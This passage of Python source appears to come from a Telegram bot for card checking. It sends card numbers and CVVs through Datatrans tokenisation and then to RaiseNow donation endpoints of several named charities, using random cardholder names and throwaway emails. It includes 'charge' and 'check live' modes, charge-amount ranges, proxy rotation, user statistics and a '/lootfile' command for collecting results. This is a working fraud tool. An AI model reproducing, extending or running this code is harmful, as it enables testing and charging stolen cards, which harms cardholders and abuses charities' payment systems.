    second_request_response = "Not attempted."
    overall_status = "Unknown ❓"

    gate_configs = {
        '1': {'formId': "250806042656273071", 'merchantId': "3000022877"},
        '2': {'formId': "250806055626003241", 'merchantId': "3000022877"},
        '3': {'formId': "250807082606088731", 'merchantId': "3000022877"},
        '4': {'formId': "250807155854598300", 'merchantId': "3000022877"},
        '6': {'formId': "250802205541759546", 'merchantId': "3000022877"},
        '7': {'formId': "250802162822879268", 'merchantId': "3000022877"},
        '8': {'formId': "250804202812044270", 'merchantId': "3000022877"},
        '9': {'formId': "250805043713003023", 'merchantId': "3000022877"}
    }
    
    config = gate_configs.get(gate_id)
    
    if not config:
        return "Unknown ❓", f"Gate {gate_id} not configured", "N/A"

    # --- Step 1: Tokenize ---
    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE", "formId": config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA",
            "merchantId": config['merchantId'], "browserUserAgent": user_agent, "browserJavaEnabled": "false",
            "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152",
            "browserScreenWidth": "2048", "browserTZ": "-420"
        }
        tokenize_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com", "X-Requested-With": "XMLHttpRequest", "User-Agent": user_agent}
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, max_retries=2)

        if error: transaction_id_info = f"Error: {error}"
        elif not token_response: transaction_id_info = "HTTP Error with no response"
        else:
            try:
                token_data = token_response.json()
                transaction_id = token_data.get("transactionId")
                if transaction_id: transaction_id_info = transaction_id
                else: transaction_id_info = f"Failed. Response: {token_response.text}"
            except json.JSONDecodeError: transaction_id_info = f"Failed. Non-JSON response: {token_response.text}"
    except Exception as e:
        transaction_id_info = f"System Error: {e}"
        return "Check Error 🔴", transaction_id_info, "Skipped due to Tokenization failure."

    if not transaction_id:
        return "Offline 🔴", transaction_id_info, "Skipped due to Tokenization failure."

    # --- Step 2: Payment/Source Request ---
    try:
        random_first_name, random_last_name = generate_random_string(10), generate_random_string(12)
        random_cardholder = f"{random_first_name} {random_last_name}"
        payment_payload, payment_url = {}, ""

        if gate_id == '1':
            mode = get_gate1_mode()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": random_email(), "birth_day": random_birth_day(), "birth_month": random_birth_month(), "birth_year": random_birth_year()}, "raisenow_parameters": {"analytics": {"channel": "paylink", "user_agent": user_agent}, "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6", "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result", "subscription": {"recurring_interval": "6 * *", "timezone": "Asia/Bangkok"}}
        elif gate_id == '2':
            mode = get_gate2_mode()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name}, "raisenow_parameters": {"analytics": {"channel": "paylink", "user_agent": user_agent}, "solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d", "name": "Ausbildung Assistenzhund für Christopher", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bchqm?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "Ausbildung Assistenzhund für Christopher", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c", "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"}
        elif gate_id == '3':
            mode = get_gate3_mode()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "6fe80dce-e221-487a-817e-5e93a1d2119a", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": "yujmyujmyuk@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[1000,2000,5000]", "user_agent": user_agent}, "solution": {"uuid": "834f9dcc-f4a1-4d56-8aa5-ab21a88d917f", "name": "Syrienhilfe (3476)", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hvtkm?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "3b718a2e-be58-48ce-95f5-ff6471108a78", "return_url": "https://donate.raisenow.io/hvtkm?lng=en&rnw-view=payment_result", "subscription": {"recurring_interval": "7 * *", "timezone": "Asia/Bangkok"}}
        elif gate_id == '4':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = json.loads(f'{{"account_uuid": "8a643026-d8e9-46b8-94dd-5bc94ff11a7c", "test_mode": false, "create_supporter": false, "amount": {{"currency": "CHF", "value": 50}}, "supporter": {{"locale": "en", "first_name": "{random_first_name}", "last_name": "{random_last_name}", "email": "jyttynhtrrthrthrt@gmail.com"}}, "raisenow_parameters": {{"analytics": {{"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": "{user_agent}"}}, "solution": {{"uuid": "55d69f66-71d4-4240-b718-b200f804399b", "name": "Förderkreise", "type": "donate"}}, "product": {{"name": "tamaro", "source_url": "https://donate.raisenow.io/hwcqr?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "integration": {{"donation_receipt_requested": "false"}}}}, "custom_parameters": {{"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "yearly", "rnw_recurring_interval_text": "Yearly"}}, "payment_information": {{"brand_code": "eca", "cardholder": "{random_cardholder}", "expiry_month": "{mes}", "expiry_year": "{ano_full}", "transaction_id": "{transaction_id}"}}, "profile": "71c2b9d6-7259-4ac6-8087-e41b5a46c626", "return_url": "https://donate.raisenow.io/hwcqr?lng=en&rnw-view=payment_result", "subscription": {{"custom_parameters": {{"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "yearly", "rnw_recurring_interval_text": "Yearly"}}, "raisenow_parameters": {{"analytics": {{"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": "{user_agent}"}}, "solution": {{"uuid": "55d69f66-71d4-4240-b718-b200f804399b", "name": "Förderkreise", "type": "donate"}}, "product": {{"name": "tamaro", "source_url": "https://donate.raisenow.io/hwcqr?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "integration": {{"donation_receipt_requested": "false"}}}}, "recurring_interval": "7 8 *", "timezone": "Asia/Bangkok"}}}}')
        elif gate_id == '6':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = {"account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": user_agent}, "solution": {"uuid": "d2c90617-8e65-4447-a5c3-c2975b1716c2", "name": "Campagne de dons mindsUP", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/fxdnk?lng=en", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "eccfaccc-7730-4875-8aed-c8b2535ecc28", "return_url": "https://donate.raisenow.io/fxdnk?lng=en&rnw-view=payment_result"}
        elif gate_id == '7':
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": user_agent}, "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result"}
        elif gate_id == '8':
            mode = get_gate8_mode()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "suggested_amounts": [], "user_agent": user_agent}, "solution": {"uuid": "e0c23079-8884-47ea-b529-1dda7b164400", "name": "Trauerspenden", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"message": "efwwef"}}, "custom_parameters": {"campaign_id": "trauerspende", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "15e9c847-fead-46e8-ab17-45c23a8ca9d4", "return_url": "https://donate.raisenow.io/mpnfg?lng=de&rnw-view=payment_result"}
        elif gate_id == '9':
            mode = get_gate9_mode()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            payment_payload = {"account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}}}, "solution": {"uuid": "7edeeaf-3394-45d5-b9e8-04fba87af7f7", "name": "Lippuner Scholarship", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0", "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "de7a9ccb-9e5b-4267-b2dc-5d406ee9a3d0", "return_url": "https://donate.raisenow.io/jgcnt?lng=en&rnw-view=payment_result"}

        payment_headers = {"Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent}
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, max_retries=2)

        if error:
            second_request_response = f"Error: {error}"
            overall_status = "Check Error 🔴"
        elif not payment_response:
            second_request_response = "HTTP Error with no response"
            overall_status = "Offline 🔴"
        else:
            second_request_response = payment_response.text
            if '{"message":"Forbidden"}' in second_request_response: overall_status = "Offline 🔴"
            else: overall_status = "Active 🟢"
    except Exception as e:
        second_request_response = f"System Error: {e}"
        overall_status = "Check Error 🔴"

    return overall_status, transaction_id_info, second_request_response


async def status_command(update, context):
    """Checks the operational status of the payment gateways."""
    if update.effective_user.id != ADMIN_ID: return
    
    msg = await update.message.reply_text("⏳ Checking gate statuses... Please wait.")
    
    test_card = "5196032172122570|4|28|766" # A generic test card

    gate_ids = ['1', '2', '3', '4', '6', '7', '8', '9']
    
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, transaction_id_info, response = future.result()
                results[gid] = (status, transaction_id_info, response)
            except Exception as e:
                results[gid] = ("Check Error 🔴", "N/A", str(e))

    final_message = "📊 **PAYMENT GATEWAY STATUS** 📊\n\n"
    for gid in sorted(results.keys(), key=lambda x: int(x)):
        status, transaction_id_info, response = results.get(gid, ("Unknown", "N/A", "No result"))
        
        # Try to format the JSON response nicely
        try:
            parsed_json = json.loads(response)
            response_display = json.dumps(parsed_json, indent=2)
        except (json.JSONDecodeError, TypeError):
            response_display = str(response)

        response_display = response_display[:1000] # Truncate long responses
        gate_name_full = get_formatted_gate_name(gid)

        final_message += (
            f"**{gate_name_full}**\n"
            f"**Status:** {status}\n"
            f"**Request 1 (Tokenize):** `transactionId: {transaction_id_info}`\n"
            f"**Request 2 Response:**\n```json\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )

    await msg.edit_text(final_message)


async def gate_command(update, context):
    """Command to change the check gate (Admin only)."""
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"ℹ️ Current active gate: **{current_gate_name}**.\n\nUse `/gate [1-4, 6-9]` to change.")
        return
        
    new_gate = context.args[0]
    # --- UPDATED TO INCLUDE GATE 1, 3 ---
    if new_gate == '1':
        keyboard = [
            [
                InlineKeyboardButton("💰 Charge", callback_data="setgate1mode_charge"),
                InlineKeyboardButton("⚡ Check Live", callback_data="setgate1mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please select a mode for **Gate 1**:",
            reply_markup=reply_markup
        )
    elif new_gate == '2':
        keyboard = [
            [
                InlineKeyboardButton("💰 Charge", callback_data="setgate2mode_charge"),
                InlineKeyboardButton("⚡ Check Live", callback_data="setgate2mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please select a mode for **Gate 2**:",
            reply_markup=reply_markup
        )
    elif new_gate == '3':
        keyboard = [
            [
                InlineKeyboardButton("💰 Charge", callback_data="setgate3mode_charge"),
                InlineKeyboardButton("⚡ Check Live", callback_data="setgate3mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please select a mode for **Gate 3**:",
            reply_markup=reply_markup
        )
    elif new_gate == '8':
        keyboard = [
            [
                InlineKeyboardButton("💰 Charge", callback_data="setgate8mode_charge"),
                InlineKeyboardButton("⚡ Check Live", callback_data="setgate8mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please select a mode for **Gate 8**:",
            reply_markup=reply_markup
        )
    elif new_gate == '9':
        keyboard = [
            [
                InlineKeyboardButton("💰 Charge", callback_data="setgate9mode_charge"),
                InlineKeyboardButton("⚡ Check Live", callback_data="setgate9mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Please select a mode for **Gate 9**:",
            reply_markup=reply_markup
        )
    elif new_gate in ['4', '6', '7']: # Gate 4, 6, 7 là các gate cố định
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"✅ Switched payment gate to: **{new_gate_name}**")
    else:
        await update.message.reply_text("❌ Invalid gate. Please choose from `1-4` or `6-9`.")

async def set_gate_range_command(update, context):
    """(Admin) Set the charge range for a gate. /setgate <id> <min> <max>"""
    if update.effective_user.id != ADMIN_ID: return
        
    if len(context.args) != 3:
        await update.message.reply_text("Usage: `/setgate <gate_id> <min_amount> <max_amount>`\nExample: `/setgate 6 50 200` (charges from $0.50 to $2.00)")
        return
        
    try:
        gate_id, min_str, max_str = context.args
        if gate_id not in ['1', '2', '3', '4', '6', '7', '8', '9']:
            await update.message.reply_text("❌ `gate_id` must be from 1, 2, 3, 4, 6 to 9.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("❌ `min_amount` cannot be greater than `max_amount`.")
            return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("❌ Amount must be a positive number.")
            return
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid data. Please enter numbers for min and max.")
        return

    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"✅ Update successful!\n**Gate {gate_id}** will now charge a random amount between **${min_val/100:.2f} - ${max_val/100:.2f}$**.\nNew display name: `{new_gate_name}`")


async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("ℹ️ The bot is already **Off**."); return

    set_bot_status(False)
    await update.message.reply_text("✅ Bot is now **OFF**. Sending notifications...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_off"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot off notification to user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"📢 Maintenance notification sent.\n- Success: {success_count}\n- Failed: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("ℹ️ The bot is already **On**."); return
    
    set_bot_status(True)
    await update.message.reply_text("✅ Bot is now **ON**. Sending notifications...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_on"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot on notification to user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"📢 Service resumed notification sent.\n- Success: {success_count}\n- Failed: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/send <user_id> <message>`"); return
        
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("❌ Invalid User ID."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"✉️ **Message from Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"✅ Message sent to user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("Usage: `/sendall <message>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("ℹ️ No authorized members to send a message to."); return
        
    await update.message.reply_text(f"📢 Starting to send message to `{len(authorized_users)}` members...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 **Announcement from Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not broadcast to user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"🏁 Message broadcast complete!\n- Success: `{success_count}`\n- Failed: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("No statistics data available yet."); return
    
    message = "📊 **USER CHECK STATISTICS** 📊\n\n"
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"👤 **{user_display}** (`{user_id_str}`)\n"
                        f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
                        f"  ✅ Approved: `{data.get('total_live_success', 0)}`\n"
                        f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ❔ Errors: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  🕒 Last Check: `{data.get('last_check_timestamp', 'Never')}`\n"
                        f"--------------------\n")
        else:
            message += (f"👤 **ID: {user_id_str}**\n"
                        f"  *Never checked or data is corrupted.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Usage: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"No check history found for user `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. Get Latest Charged File", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. Get All Charged Files", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Select From History", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Select an option to retrieve files for user `{target_user_id}`:", reply_markup=reply_markup)

# --- PROXY MANAGEMENT COMMANDS ---
async def on_proxy_command(update, context):
    """(Admin) Enable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("✅ Proxy usage has been **ENABLED**. Card checks will now be performed through a random proxy.")

async def off_proxy_command(update, context):
    """(Admin) Disable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("☑️ Proxy usage has been **DISABLED**. Checks will no longer use a proxy.")

async def add_proxy_command(update, context):
    """(Admin) Add a new proxy to the list."""
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Usage: `/addprx <proxy>`\nExample: `/addprx 123.45.67.89:8080` or `/addprx ip:port:user:pass`")
        return

    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("❌ **Invalid format.** Please use `ip:port` or `ip:port:user:pass`."); return

    msg = await update.message.reply_text(f"⏳ Testing proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)

    if not is_working:
        await msg.edit_text(f"❌ **Proxy is not working.**\nReason: `{reason}`\nProxy was not added to the list.")
        return

    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"ℹ️ Proxy `{proxy_str}` already exists in the list.")
        return
        
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"✅ **Proxy is working and has been added!**\n- Proxy: `{proxy_str}`\n- Total proxies available: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    """(Admin) Display the proxy list for deletion."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("📭 The proxy list is empty.")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"🗑️ {proxy}", callback_data=f"delprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select a proxy to delete:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    """(Admin) Display the proxy list for testing."""
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "Enabled" if proxies_data.get('enabled') else "Disabled"

    if not proxies:
        await update.message.reply_text(f"📭 The proxy list is empty.\nProxy usage status: **{status}**")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"🧪 {proxy}", callback_data=f"testprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Select a proxy to test (connects to google.com):\nProxy usage status: **{status}**", reply_markup=reply_markup)
# --- END PROXY COMMANDS ---

async def button_handler(update, context):
    query = update.callback_query
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    # --- GATE 1, 2, 3, 8 & 9 MODE SELECTION ---
    if command == "setgate1mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate1_mode(mode)
        set_active_gate('1') # Ensure gate 1 is selected
        
        new_gate_name = get_formatted_gate_name('1')
        await query.answer(f"Switched to {new_gate_name}")
        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
        return

    if command == "setgate2mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate2_mode(mode)
        set_active_gate('2') # Ensure gate 2 is selected
        
        new_gate_name = get_formatted_gate_name('2')
        await query.answer(f"Switched to {new_gate_name}")
        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
        return

    if command == "setgate3mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate3_mode(mode)
        set_active_gate('3') # Ensure gate 3 is selected
        
        new_gate_name = get_formatted_gate_name('3')
        await query.answer(f"Switched to {new_gate_name}")
        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
        return

    if command == "setgate8mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate8_mode(mode)
        set_active_gate('8') # Ensure gate 8 is selected
        
        new_gate_name = get_formatted_gate_name('8')
        await query.answer(f"Switched to {new_gate_name}")
        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
        return
        
    if command == "setgate9mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate9_mode(mode)
        set_active_gate('9') # Ensure gate 9 is selected
        
        new_gate_name = get_formatted_gate_name('9')
        await query.answer(f"Switched to {new_gate_name}")
        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
        return

    # --- Handle stop task buttons ---
    if command == "stop":
        await query.answer()
        action = data[1] # 'task' or 'mytask'
        target_user_id = int(data[2])

        # Admin can stop anyone's task
        if action == "task" and user_from_callback.id == ADMIN_ID:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"✅ Stop request sent for user `{target_user_id}`'s task.")
            else:
                await query.edit_message_text(f"ℹ️ The task for user `{target_user_id}` has already ended or does not exist.", reply_markup=None)
        
        # User can only stop their own task
        elif action == "mytask" and user_from_callback.id == target_user_id:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text("⏳ Stop request sent. The task will stop shortly...", reply_markup=None)
            else:
                await query.edit_message_text("ℹ️ Your task has already ended or does not exist.", reply_markup=None)
        
        else:
                await query.answer("You do not have permission to perform this action.", show_alert=True)
        return

    # --- HANDLE PROXY BUTTONS (ADMIN ONLY) ---
    if command == "delprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True); return
        
        try:
